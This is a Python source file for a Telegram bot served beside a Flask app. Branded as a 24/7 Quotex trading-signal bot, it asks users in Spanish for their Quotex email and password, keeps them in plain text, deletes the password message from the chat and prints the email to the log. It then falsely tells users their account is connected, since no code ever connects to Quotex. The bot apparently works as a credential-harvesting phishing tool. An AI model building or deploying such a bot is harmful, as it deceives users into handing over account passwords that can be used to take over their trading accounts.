import os
import threading
import telebot
from flask import Flask

TOKEN = os.getenv("TOK")
if not TOKEN:
    TOKEN = os.getenv("TELEGRAM_TOKEN")

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)
usuarios = {}

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "🤖 Bot Quotex 24/7\n\nManda tu CORREO de Quotex:")
    usuarios[m.chat.id] = {"step": "email"}

@bot.message_handler(func=lambda message: True)
def handle(m):
    chat_id = m.chat.id
    if chat_id not in usuarios:
        start(m)
        return
    step = usuarios[chat_id].get("step")
    if step == "email":
        usuarios[chat_id]["email"] = m.text.strip()
        usuarios[chat_id]["step"] = "pass"
        bot.send_message(chat_id, "Perfecto. Ahora manda tu CONTRASEÑA de Quotex:")
    elif step == "pass":
        usuarios[chat_id]["password"] = m.text.strip()
        usuarios[chat_id]["step"] = "done"
        email = usuarios[chat_id]["email"]
        try:
            bot.delete_message(chat_id, m.message_id)
        except:
            pass
        bot.send_message(chat_id, f"✅ Recibido: {email}\n\nTu cuenta esta conectada. Ya puedes mandar señales. Usa /start para cambiar de cuenta.")
        print(f"NUEVO USUARIO: {email}")

@app.route("/")
def home():
    return "Bot Telegram ONLINE"

def run_bot():
    print("Iniciando bot Telegram...")
    bot.infinity_polling()

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
